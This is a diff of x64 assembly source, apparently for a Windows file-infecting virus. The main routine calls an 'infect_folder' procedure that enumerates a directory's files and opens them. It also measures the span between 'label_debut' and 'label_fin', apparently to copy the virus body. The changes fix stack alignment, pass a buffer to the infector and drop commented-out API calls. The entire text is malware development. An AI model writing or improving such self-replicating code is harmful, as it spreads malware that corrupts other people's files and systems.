@@ -54,28 +54,13 @@ main proc
 		sub rsp, 232
 		or rsp, 0fh
 		inc rsp
-		sub rsp, 010h
-
-		mov rcx, 0
-		lea rdx, [rsp + 32]
-		mov r8, 192
-
-
-;		test BYTE ptr [MUST_EXIT], 1
-;		jne	not_nt_get_module_file_name_debut_main
-;		call proc_nt_get_module_file_name ; Si must exit = 0
-;not_nt_get_module_file_name_debut_main:
-;		call GetModuleFileNameA
-		
-;		lea rcx, [rsp + 32]
-;		test BYTE ptr [MUST_EXIT], 1
-;		jne	not_nt_create_file
-;		call proc_nt_create_file ; Si must exit = 0
-;		not_nt_create_file:
-;	 	call CreateFileA
+		sub rsp, 010h ; Alignement de la stack
 
 		lea rcx, TMP_1
+		lea rdx, [rsp + 32]
+		mov r8, 192
 		call infect_folder
+
 		mov rdx, label_fin
 		mov rcx, label_debut
 		sub rdx, rcx
@@ -512,16 +497,18 @@ ret_ok:
 open_file endp
 
 ; rbp	
+; 528-536	: Padding
 ; 400-528	: path + file name
 ; 40-400	: structure WIN32_FIND_DATA dirent
 ; 32-40		: folder_name
 ; 00-32		: shadow
 ; rsp
 
-infect_folder proc ; parametres : char *folder_name
+infect_folder proc ; parametres : char *folder_name, void *buffer, size of buffer
 		push rbp
 		mov rbp, rsp
-		sub	rsp, 528
+		push rsi
+		sub	rsp, 536
 
 		mov [rsp + 32], rcx
 
@@ -574,6 +561,7 @@ end_find_next_file:
 		jmp loop_start
 loop_end:
 		xor rax, rax
+		pop rsi
 		mov rsp, rbp
 		pop rbp
 		ret
